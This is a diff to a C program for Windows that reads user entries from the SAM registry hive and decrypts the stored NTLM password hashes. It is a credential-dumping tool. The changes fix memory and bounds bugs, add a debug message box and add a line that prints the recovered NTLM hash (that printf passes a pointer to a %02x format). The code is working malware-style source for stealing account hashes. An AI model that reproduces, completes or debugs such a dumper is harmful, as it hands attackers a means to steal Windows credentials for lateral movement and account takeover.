@@ -128,7 +128,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
 	DWORD maxLenOfNames;
 	ULONG nEntries = 0;
-	PSAM sams[MAX_SAM_ENTRIES];
+	PSAM sams[MAX_SAM_ENTRIES] = {};
 
 	DWORD ret;
 
@@ -152,7 +152,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 	}
 
 
-	for (ULONG i = 0; i < keyInfo->SubKeys; i++) {
+	for (ULONG i = 0; i < keyInfo->SubKeys && i < MAX_SAM_ENTRIES; i++) {
 		maxLenOfNames = MAX_KEY_LENGTH;
 
 		ret = pMyNtEnumerateKey(key, i, KeyBasicInformation, NULL, 0, &lengthBuff);
@@ -188,7 +188,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 				exit(ret);
 			}
 
-			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), NULL, sizeof(SAM));
+			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAM));
 			wcscpy_s(sam->rid, keyInfoSubKeysBasic->NameLength, keyInfoSubKeysBasic->Name);
 
 			getClasses(sam);
@@ -230,12 +230,15 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 	ULONG lenRet = nEntries * sizeof(SAM);
 	CopyMemory(size, &lenRet, sizeof(ULONG));
+	
 	if (samRegEntries != NULL) {
-		for (ULONG i = 0; i < nEntries; i++) {
-			CopyMemory(samRegEntries[i], sams[i], sizeof(SAM));
-			HeapFree(GetProcessHeap(), 0, sams[i]);
+		for (int i = 0; i < nEntries; i++) {			
+			samRegEntries[i] = sams[i];
+			//HeapFree(GetProcessHeap(), 0, sams[i]);
 		}
 	}
+	
+	return;
 }
 
 
@@ -445,6 +448,8 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		CopyMemory(NTLM, NTLM1, 8);
 		CopyMemory(NTLM+8, NTLM2, 8);
 
+		printf("NTLM: %02x", &NTLM);
+
 		HeapFree(GetProcessHeap(), 0, &username);
 	}
 }
@@ -566,7 +571,7 @@ int main(int argc, char** argv) {
 	pMyRtlInitUnicodeString = (myRtlInitUnicodeString)myGetProcAddress((PCHAR)"ntdll.dll", (PCHAR)"RtlInitUnicodeString");
 
 	if (pMyMessageBox != NULL) {
-		pMyMessageBox(NULL, (LPCWSTR)L"TEST", (LPCWSTR)L"TEST", MB_OK);
+		pMyMessageBox(NULL, (LPCTSTR)"Wait", (LPCTSTR)"Debug Wait", MB_OK);
 	}
 
 	// Time to debug as always works at first :D
@@ -574,7 +579,7 @@ int main(int argc, char** argv) {
 	getSAM(NULL, &size);
 
 	// Array of PSAM
-	PSAM *sam = (PSAM*)HeapAlloc(GetProcessHeap(), 0, size);
+	PSAM sam[MAX_SAM_ENTRIES] = {};
 
 	getSAM(sam, &size);
 
